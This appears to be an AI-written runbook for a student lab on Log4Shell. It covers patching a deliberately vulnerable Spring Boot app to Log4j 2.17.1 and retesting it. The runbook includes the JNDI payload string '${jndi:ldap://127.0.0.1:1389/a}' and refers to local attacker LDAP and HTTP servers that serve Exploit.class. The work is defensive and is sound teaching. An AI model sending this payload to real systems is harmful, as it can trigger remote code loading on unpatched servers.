# AIR-Project1-Task2
Proof of Concept Replication of the Incident

Perfect, this is the right moment to “flip the switch” and show **before/after** behaviour with a proper Log4j patch.

Below is a *drop-in runbook* you can follow on your current VM to:

1. Upgrade Log4j in `log4shell-vulnerable-app`
2. Rebuild & restart the app
3. Re-run the **same JNDI payload** and show that it no longer triggers LDAP / JNDI

---

## 1. Patch Log4j in the Gradle build

You already have the app checked out at:

```bash
/opt/log4shell/log4shell-vulnerable-app
```

Spring Boot is pulling Log4j 2.14.1 via `spring-boot-starter-log4j2:2.6.1`, which is vulnerable.
We’ll force **all Log4j artifacts** to a safe version like **2.17.1** (fixes Log4Shell and follow-up CVEs).

### Step 1.1 – Backup and edit `build.gradle`

```bash
cd /opt/log4shell/log4shell-vulnerable-app

# Backup original
cp build.gradle build.gradle.bak-before-log4j-patch

# Edit
nano build.gradle
```

Scroll to the bottom (or anywhere at top level, outside other blocks) and **add this block**:

```groovy
// Force all Log4j dependencies to a safe version (patch CVE-2021-44228 & friends)
configurations.all {
    resolutionStrategy.eachDependency { DependencyResolveDetails details ->
        if (details.requested.group == 'org.apache.logging.log4j') {
            details.useVersion '2.17.1'
            details.because 'Upgrade Log4j to >= 2.17.1 to mitigate Log4Shell'
        }
    }
}
```

Save & exit (`Ctrl+O`, `Enter`, `Ctrl+X`).

> This is the same Gradle approach shown in Log4j exploitation tutorials (forcing the Log4j group version via `resolutionStrategy`).

---

## 2. Rebuild the vulnerable app with the patched Log4j

Still in `/opt/log4shell/log4shell-vulnerable-app` as **user `log4shell`**:

```bash
./gradlew clean build
```

(This will regenerate `build/libs/log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar`.)

### Optional: prove the new Log4j version inside the JAR

```bash
cd /opt/log4shell/log4shell-vulnerable-app

jar tf build/libs/log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar \
  | grep 'log4j-core'
```

You want to see something like:

```text
BOOT-INF/lib/log4j-core-2.17.1.jar
```

That’s your **evidence screenshot** for “patched Log4j version”.

---

## 3. Restart the Java app with the patched JAR

First, stop any old instance:

```bash
# As log4shell or parallels
pkill -f 'log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar' || true
```

Then start the app again using your existing helper script (it already auto-picks the latest JAR):

```bash
cd /opt/log4shell
./run-vulnerable-app.sh
```

Sanity-check:

```bash
curl -s -D- http://127.0.0.1:8080/ | head
```

You should still get the “Hello, world!” response.

---

## 4. Re-run the **same Log4Shell payload**

You already have the attacker infra:

* HTTP payload server on `:8000`
* LDAP server on `:1389`

If they’re not running, restart them:

```bash
cd /opt/log4shell

./run-http-server.sh    # terminal 1
./run-ldap-server.sh    # terminal 2
./run-vulnerable-app.sh # terminal 3 (already done)
```

Now, in another shell (parallels or log4shell), set the payload and trigger:

```bash
cd /opt/log4shell
export JNDI_PAYLOAD='${jndi:ldap://127.0.0.1:1389/a}'
./trigger-exploit.sh
```

You should still see:

```text
[*] Sending Log4Shell test payload to http://127.0.0.1:8080/ ...
Hello, world!
```

---

## 5. Compare logs **before vs after** patch

This is the “demonstration” part for your assignment.

### 5.1 LDAP server log (before patch: **activity**, after patch: **no new lines**)

Check LDAP log:

```bash
tail -n 20 /opt/log4shell/logs/ldap-server.log
```

* **Before patch** you saw lines like:

  ```text
  Send LDAP reference result for a redirecting to http://127.0.0.1:8000/Exploit.class
  ```
* **After patch to Log4j 2.17.1**, sending the **same payload** should **not** generate any *new* LDAP queries when you re-run the exploit.

If there are timestamps, you can clearly show: *“no LDAP requests at time T2 after patch”*.

---

### 5.2 HTTP server log (still only manual tests)

Check HTTP log:

```bash
tail -n 20 /opt/log4shell/logs/http-server.log
```

* You’ll still see entries for your **manual `curl`** like:

  ```text
  127.0.0.1 - - [...] "HEAD /Exploit.class HTTP/1.1" 200 -
  ```
* But when you trigger the exploit with patched Log4j, **no new GET/HEAD** from the app should appear.

This supports: *“JVM no longer attempts to fetch `Exploit.class` via Log4j JNDI lookups after patching”*.

---

### 5.3 Application log: payload now logged as plain text

Finally, check the Spring Boot app log:

```bash
tail -n 40 /opt/log4shell/vulnerable-app-native.log
```

Look for the line that logs the header. Before patch, Log4j was evaluating the `${jndi:...}` and you saw:

```text
HelloWorld : Received a request for API version Reference Class Name: foo
```

After upgrading to 2.17.x, Log4j has JNDI lookups disabled by default, so you should see one of these behaviours:

* The **literal string** `${jndi:ldap://127.0.0.1:1389/a}` in the log, or
* A benign message where the JNDI placeholder *does not* trigger any outbound LDAP.

This lines up with vendor guidance: **the main remediation is to upgrade Log4j to 2.17.1+**, which disables the dangerous JNDI lookups and fixes follow-up issues.

---

## 6. How to describe this in your report / demo

You can summarise the “patch & retest” story like this:

1. **Initial state (vulnerable)**

   * `build.gradle` pulls `spring-boot-starter-log4j2:2.6.1`, which brings in `log4j-core:2.14.1`.
   * Sending `X-Api-Version: ${jndi:ldap://127.0.0.1:1389/a}` causes:

     * Log4j to perform a JNDI lookup.
     * Outbound LDAP requests to `127.0.0.1:1389` (seen in `ldap-server.log`).
     * LDAP replies referencing `http://127.0.0.1:8000/Exploit.class`.

2. **Patch**

   * Add a Gradle `resolutionStrategy` block to force all `org.apache.logging.log4j` artifacts to `2.17.1`.
   * Rebuild the application; the fat JAR now contains `log4j-core-2.17.1.jar`.

3. **Post-patch behaviour (same payload)**

   * The same HTTP request with `X-Api-Version: ${jndi:ldap://127.0.0.1:1389/a}`:

     * Returns “Hello, world!” to the client (app still works).
     * **Does not** generate new LDAP queries (no additional entries in `ldap-server.log`).
     * **Does not** fetch `/Exploit.class` from the HTTP server.
     * Logs the payload as plain text / without JNDI resolution.

4. **Conclusion**

   * This demonstrates that **upgrading Log4j** (rather than relying on JVM quirks or partial mitigations) effectively blocks the Log4Shell exploit path, even though the application logic and the incoming payload remain unchanged.

---

If you paste a short snippet from your *after-patch* logs (LDAP + app log), I can help you turn it into a very clean 1–2 paragraph “Results of patching” section for Task 2 / Task 3.
